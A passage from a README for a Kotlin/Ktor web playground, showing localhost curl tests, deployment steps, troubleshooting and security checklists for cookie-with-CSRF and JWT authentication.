     -H "X-CSRF-Token: abc-123-xyz" \
     -b cookies.txt

# Expected: HTTP 200 OK
# <html>...Welcome page...</html>
```

**3. Access without CSRF token (should fail with 403):**

```bash
curl http://localhost:4207/api/secret \
     -b cookies.txt

# Expected: HTTP 403 Forbidden
# {"error":"Invalid or missing CSRF token"}
```

**4. Access with invalid CSRF token (should fail with 403):**

```bash
curl http://localhost:4207/api/secret \
     -H "X-CSRF-Token: wrong-token" \
     -b cookies.txt

# Expected: HTTP 403 Forbidden
# {"error":"Invalid or missing CSRF token"}
```

**5. Access without session cookie (should fail with 401):**

```bash
curl http://localhost:4207/api/secret \
     -H "X-CSRF-Token: abc-123-xyz"

# Expected: HTTP 401 Unauthorized
# {"error":"Authentication required","requiresAuth":true}
```

**6. Logout:**

```bash
curl http://localhost:4207/api/logout \
     -b cookies.txt

# Expected: HTTP 200 OK
# {"success":true,"message":"Logged out successfully"}
```

### Test JWT Authentication Flow

**1. JWT Login and capture token:**

```bash
curl -X POST http://localhost:4207/api/jwt/login \
     -H "Content-Type: application/json" \
     -d '{"username":"test@example.com","password":"password"}' \
     -v

# Expected response:
# HTTP/1.1 200 OK
# {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}

# Save the token value for next steps
```

**2. Access JWT protected endpoint with valid token (should succeed):**

```bash
curl http://localhost:4207/api/jwt/secret \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Expected: HTTP 200 OK
# {"hello":"test@example.com"}
```

**3. Access JWT endpoint without token (should fail with 401):**

```bash
curl http://localhost:4207/api/jwt/secret

# Expected: HTTP 401 Unauthorized
```

**4. Access JWT endpoint with invalid token (should fail with 401):**

```bash
curl http://localhost:4207/api/jwt/secret \
     -H "Authorization: Bearer invalid-token-here"

# Expected: HTTP 401 Unauthorized
```

**5. JWT login with wrong credentials (should fail with 403):**

```bash
curl -X POST http://localhost:4207/api/jwt/login \
     -H "Content-Type: application/json" \
     -d '{"username":"test@example.com","password":"wrongpassword"}'

# Expected: HTTP 403 Forbidden
# {"error":"Invalid username and/or password"}
```

### Decode JWT Token (For Testing)

You can decode JWT tokens at [jwt.io](https://jwt.io) or using command line:

```bash
# Install jq if not available
# Linux: sudo apt install jq
# Mac: brew install jq

# Decode JWT payload (paste your token)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
echo $TOKEN | cut -d'.' -f2 | base64 -d | jq

# Example output:
# {
#   "aud": "myApp",
#   "iss": "http://0.0.0.0:4207",
#   "userId": 1,
#   "exp": 1766184860
# }
```

### Compare Cookie vs JWT Requests

**Cookie-Based Request:**

```bash
# Requires: Session cookie + CSRF token header
curl http://localhost:4207/api/secret \
     -H "X-CSRF-Token: abc-123-xyz" \
     -b cookies.txt
```

**JWT Request:**

```bash
# Requires: Only Authorization header with Bearer token
curl http://localhost:4207/api/jwt/secret \
     -H "Authorization: Bearer eyJhbGci..."
```

**Key Difference:** JWT is simpler (no cookies, no CSRF), Cookie is more secure for browsers (httpOnly protection).

### Verify Cookie in Browser

1. Open browser DevTools (F12)
2. Navigate to Application → Cookies → `https://your-api.com`
3. Verify cookie properties:

```
Name:      user-session
Value:     <encrypted-value>
Domain:    your-api.com
Path:      /
Secure:    ✓ (checkmark)
HttpOnly:  ✓ (checkmark)
SameSite:  None
Max-Age:   86400
```

---

## Deployment

### Environment Configuration

Set environment variable to select configuration:

```bash
export WEB_PLAYGROUND_ENV=prod
```

**Configuration files:**

- `app.conf` - Base configuration
- `app-local.conf` - Local development overrides
- `app-prod.conf` - Production settings

### Build and Run

```bash
# Build application
./gradlew build

# Run locally
./gradlew run

# Production deployment
./build/install/web-playground/bin/web-playground
```

### Adding New Domains

To allow a new domain to authenticate:

1. **Update CORS configuration** in `src/main/kotlin/com/vshpynta/Main.kt`:
   ```kotlin
   install(CORS) {
       // ...existing configuration...
       allowHost("newclient.com", schemes = listOf("https"))
   }
   ```

2. **Rebuild and deploy:**
   ```bash
   ./gradlew build
   ```

3. **Verify CORS works:**
   ```bash
   curl -H "Origin: https://newclient.com" \
        -H "Access-Control-Request-Method: POST" \
        -X OPTIONS \
        https://your-api.com/api/login -v
   ```

No changes required to existing frontend applications or other domains.

---

## Troubleshooting

### Cookie Not Being Set

**Symptoms:**

- Login returns success but no cookie in browser DevTools
- Subsequent requests return 401

**Possible causes:**

- Backend not using HTTPS (Secure flag requires HTTPS)
- Frontend missing `credentials: 'include'`
- Domain not in CORS `allowHost()` list
- `allowCredentials = false` in CORS

**Solution:**

1. Verify backend uses HTTPS in production
2. Check fetch requests include `credentials: 'include'`
3. Verify domain is in allowHost list
4. Check CORS preflight response headers

### CORS Policy Errors

**Error message:**

```
Access to fetch at 'https://api.com/api/login' from origin 
'https://app.com' has been blocked by CORS policy
```

**Solution:**

1. Add domain to `allowHost()` in Main.kt
2. Check domain spelling (including www. prefix)
3. Ensure `schemes = listOf("https")` for production
4. Rebuild and redeploy

### Cookie Not Sent with Requests

**Symptoms:**

- Login succeeds, cookie visible in DevTools
- Protected endpoints return 401

**Solution:**

- Add `credentials: 'include'` to all fetch requests
- Verify cookie hasn't expired (check Max-Age)
- Check request goes to same domain as cookie
- Verify browser allows third-party cookies

### CSRF Validation Failing

**Symptoms:**

- Login succeeds
- Protected endpoints return 403

**Solution:**

- Include `X-CSRF-Token` header in all authenticated requests
- Verify token matches the one from login response
- Check token hasn't been cleared from memory
- Ensure token is valid (not expired with session)

### Debug Checklist

```javascript
// Add this to your frontend for debugging
console.log('CSRF Token:', csrfToken);
console.log('Request URL:', url);
console.log('Request Headers:', {
    'X-CSRF-Token': csrfToken,
    'credentials': 'include'
});

// Check response
console.log('Response Status:', response.status);
console.log('Response Body:', await response.json());
```

---

## Production Considerations

### Security Checklist - Common (Both Methods)

- [ ] **HTTPS enabled** on backend
- [ ] **HTTPS enabled** on all frontend domains
- [ ] **Domain allowlist updated** with real domains (remove examples)
- [ ] **Test domains removed** from production CORS config
- [ ] **Error handling** implemented in frontend (401/403)
- [ ] **Rate limiting** considered for login endpoints
- [ ] **Monitoring** set up for authentication failures
- [ ] **Input sanitization** to prevent XSS attacks
- [ ] **Security headers** configured (CSP, X-Frame-Options, etc.)

### Security Checklist - Cookie-Based Authentication

- [ ] **Cookie Secure flag** enabled (useSecureCookie = true)
- [ ] **SameSite=None** in production config (cross-domain)
- [ ] **CSRF tokens** working on all authenticated routes
- [ ] **HttpOnly flag** enabled (prevents JavaScript access)
- [ ] **Cookie encryption/signing keys** stored securely

### Security Checklist - JWT Authentication

- [ ] **Token expiration** set appropriately (consider 15 min for access tokens)
- [ ] **Refresh token mechanism** implemented if using short expiry
- [ ] **JWT signing key** stored securely (environment variable, not hardcoded)
- [ ] **Different signing keys** for production vs development
- [ ] **Token storage** in memory only for web apps (NOT localStorage)
- [ ] **Audience and issuer** validation configured correctly
- [ ] **Token revocation** mechanism considered (if needed for your use case)
- [ ] **Content Security Policy** configured to mitigate XSS

### Monitoring

**Log authentication events:**

```kotlin
post("/api/login", webResponse {
    if (userId != null) {
        log.info("Successful login: userId=$userId, origin=${call.request.origin.host}")
    } else {
        log.warn("Failed login attempt: origin=${call.request.origin.host}")
    }
})
```

**Monitor for:**

- Unusual number of failed login attempts
- Authentication from unexpected origins
- High rate of 403 errors (potential CSRF attack)
- Session hijacking patterns

### Domain Management

**Maintain documentation for each allowed domain:**

- Domain name
- Owner/organization
- Date added
- Purpose/use case
- Technical contact
- Date last reviewed

**Review quarterly:**

- Remove inactive domains
- Verify contacts are current
- Check for security updates needed

### JWT Authentication Issues

**Symptoms:**

- JWT login successful but protected endpoints return 401
- Token expires too quickly
- Token stolen via XSS

**Possible causes:**

1. **Token not included in Authorization header:**
   ```javascript
   // ❌ Wrong: Missing Authorization header
   fetch('https://api.com/api/jwt/secret')
   
   // ✅ Correct: Include Bearer token
   fetch('https://api.com/api/jwt/secret', {
       headers: { 'Authorization': `Bearer ${jwtToken}` }
   })
   ```

2. **Token stored in localStorage (XSS vulnerability):**
   ```javascript
   // ❌ Wrong: Vulnerable to XSS attacks
   localStorage.setItem('token', jwtToken)
   
   // ✅ Correct: Store in memory or implement refresh tokens
   let jwtToken = null  // Lost on refresh, but safer
   ```

3. **Token expired:**
    - Tokens expire after 1 day by default
    - Check `exp` claim by decoding token at [jwt.io](https://jwt.io)
    - Implement token refresh logic or shorter expiry with refresh tokens

4. **Audience or issuer mismatch:**
    - Verify backend `jwtAudience` matches token's `aud` claim
    - Verify backend `jwtIssuer` matches token's `iss` claim

5. **Incorrect Bearer format:**
   ```javascript
   // ❌ Wrong formats
   'Authorization': jwtToken              // Missing "Bearer "
   'Authorization': `Token ${jwtToken}`   // Wrong scheme
   
   // ✅ Correct format
   'Authorization': `Bearer ${jwtToken}`  // Note the space after Bearer
   ```

**Solutions:**

- Always include `Authorization: Bearer <token>` header
- Store tokens in memory (not localStorage) for better security
- Implement refresh token mechanism for long-lived sessions
- Add Content Security Policy headers to mitigate XSS
- Monitor token expiration and redirect to login

### Performance Optimization

**Session/Token storage:**

- Consider Redis for distributed session validation (if needed)
- Monitor token payload size (keep claims minimal)
- JWT doesn't require server-side storage (fully stateless)

**CORS:**

- Cache CORS preflight responses
- Minimize domain list size
- Use CDN for static assets

### Architecture Comparison

| Feature           | Reverse Proxy  | Subdomain           | Cross-Domain (This Project) |
|-------------------|----------------|---------------------|-----------------------------|
| **Architecture**  | Same domain    | Same parent domain  | Any domains                 |
| **Example**       | `app.com/api/` | `api.example.com`   | `myapp.com` + `partner.com` |
| **Cookie Domain** | Current        | `.example.com`      | Backend only                |
| **SameSite**      | Strict/Lax     | Lax                 | None                        |
| **CORS Needed**   | No             | Yes                 | Yes                         |
| **CSRF Risk**     | Lowest         | Low                 | Higher (mitigated)          |
| **Flexibility**   | Limited        | Moderate            | Maximum                     |
| **Setup**         | Nginx/proxy    | DNS config          | Code config                 |
| **Use Case**      | Single org     | Multi-app, same org | Multi-tenant, any org       |

---

## Summary

This project implements a secure, production-ready authentication system with **two methods** to choose from:

### Cookie-Based Authentication Features

**✅ Security:**

- HttpOnly, Secure cookies with SameSite=None
- Encrypted session storage with AES + HMAC
- CSRF protection for all authenticated requests
- Explicit domain allowlist (no wildcards)
- HTTPS enforcement in production
- Clear error responses (401 vs 403)
- **Best XSS protection** (JavaScript cannot access tokens)

**✅ Functionality:**

- Cross-domain authentication support
- Centralized CSRF validation
- JSON API responses
- Session management with automatic expiry
- Server-managed logout

**✅ Best For:**

- Traditional web applications
- Browser-based clients
- Same or related domains

### JWT Authentication Features

**✅ Security:**

- HMAC256 signed tokens (tamper-proof)
- Audience and issuer validation
- Automatic token expiration (1 day)
- No CSRF protection needed
- HTTPS enforcement in production
- ⚠️ **Vulnerable to XSS if stored in localStorage** (use memory storage)

**✅ Functionality:**

- Stateless token-based authentication
- Simple Authorization header transport
- JSON API responses
- Token contains all user data
- Client-managed logout

**✅ Best For:**

- REST APIs
- Mobile applications
- Third-party integrations
- Microservices
- Cross-domain without cookie complexity

### Choosing the Right Method

| Use Case                       | Recommended Method | Reason                          |
|--------------------------------|--------------------|---------------------------------|
| Web application (same domain)  | Cookie-Based       | Best security (httpOnly)        |
| Web application (cross-domain) | Cookie-Based       | Good security + CSRF protection |
| Mobile app                     | JWT                | No cookie support, simpler      |
| API for third parties          | JWT                | Standard, easy to integrate     |
| Microservices                  | JWT                | Stateless, scalable             |
| Users disable cookies          | JWT                | Fallback option                 |

### Developer Experience

**✅ Both Methods Provide:**

- Simple frontend integration
- Clear documentation with examples
- Comprehensive testing guides
- Easy configuration
- Production-ready code
- Stateless architecture (no server storage)

**Your authentication system is secure, flexible, and ready for production deployment!** 🔒✨

